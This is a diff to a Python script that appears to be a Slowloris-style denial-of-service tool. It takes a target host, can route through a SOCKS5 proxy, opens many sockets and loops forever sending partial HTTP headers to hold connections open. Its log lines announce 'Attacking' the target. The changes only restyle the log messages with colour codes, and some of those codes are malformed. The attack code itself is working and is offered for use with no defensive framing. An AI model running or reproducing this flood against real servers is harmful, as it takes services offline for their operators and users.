@@ -27,7 +27,7 @@ if len(sys.argv) <= 1:
     sys.exit(1)
 
 if not args.host:
-    print("Host required!")
+    print("Host Required !")
     parser.print_help()
     sys.exit(1)
 
@@ -39,7 +39,7 @@ if args.useproxy:
         import socks
         socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
         socket.socket = socks.socksocket
-        logging.info("Using SOCKS5 proxy for connecting...")
+        logging.info("Using SOCKS5 Proxy For Connecting...")
     except ImportError:
         logging.error("Socks Proxy Library Not Available!")
 
@@ -170,19 +170,19 @@ def init_socket(ip):
 def main():
     ip = args.host
     socket_count = args.sockets
-    logging.info("[*] Attacking %s With %s Sockets .", ip, socket_count)
+    logging.info("\033[92m[*] Attacking %s With %s Sockets \033[0m", ip, socket_count)
 
-    logging.info("[*] Creating Sockets . . .")
+    logging.info("[94m[*] Creating Sockets . . . \033[0m")
     for _ in range(socket_count):
         try:
-            logging.debug("[*] Creating Socket nr %s", _)
+            logging.debug("[96m[*] Creating Socket nr %s \033[0m", _)
             s = init_socket(ip)
         except socket.error:
             break
         list_of_sockets.append(s)
 
     while True:
-        logging.info("[*] Packet Sent ✓ AsparTim : %s", len(list_of_sockets))
+        logging.info("[97m[*] Packet Sent ✓ AsparTim : %s \033[0m", len(list_of_sockets))
         for s in list(list_of_sockets):
             try:
                 s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
